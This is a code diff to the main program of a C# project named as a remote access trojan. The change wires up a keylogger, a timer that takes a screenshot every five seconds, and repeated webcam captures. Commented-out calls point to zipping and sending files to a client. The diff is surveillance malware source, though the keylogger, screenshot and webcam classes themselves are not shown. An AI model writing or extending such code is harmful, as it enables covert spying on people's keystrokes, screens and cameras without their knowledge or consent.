@@ -7,28 +7,18 @@ namespace remote_access_trojan
 {
     class Program
     {
-        const int SW_HIDE = 0;
         static System.Timers.Timer timer;
+        static Webcam webcam;
         static int timerCount = 1;
 
         static void Main(string[] args)
         {
-            // Hide the window on open
-            //var handle = GetConsoleWindow();
-            //ShowWindow(handle, SW_HIDE);
-
-            Console.WriteLine("Hello World!");
-            //Client.ExecuteClient();
-
-            SetTimer();
             Keylogger.Run();
+            webcam = new Webcam();
+            SetTimer();
 
-            Webcam webcam = new Webcam();
-            Thread.Sleep(1000);
-            webcam.TakePicture(1);
-
-           // Client.ZipFiles();
-          //  Client.newClient();
+            // Client.ZipFiles();
+            //  Client.newClient();
 
             // Do not move - this needs to be the last line
             Application.Run();
@@ -37,7 +27,7 @@ namespace remote_access_trojan
         private static void SetTimer()
         {
             // Create a timer with a 20 second interval.
-            timer = new System.Timers.Timer(20000);
+            timer = new System.Timers.Timer(5000);
 
             timer.Elapsed += OnTimerTick;
             timer.AutoReset = true;
@@ -47,7 +37,7 @@ namespace remote_access_trojan
         private static void OnTimerTick(Object source, ElapsedEventArgs e)
         {
             // 2 minutes is up
-            if (timerCount >= 10)
+            if (timerCount >= 24)
             {
                 // Client.SendFile()
                 timer.Stop();
@@ -55,9 +45,8 @@ namespace remote_access_trojan
             }
 
             Screenshot.takeScreenshot(timerCount);
-            //Webcam.TakePicture(timerCount);
+            webcam.TakePicture(timerCount);
             Console.WriteLine("Timer Tick: " + timerCount);
-
             timerCount++;
         }
 
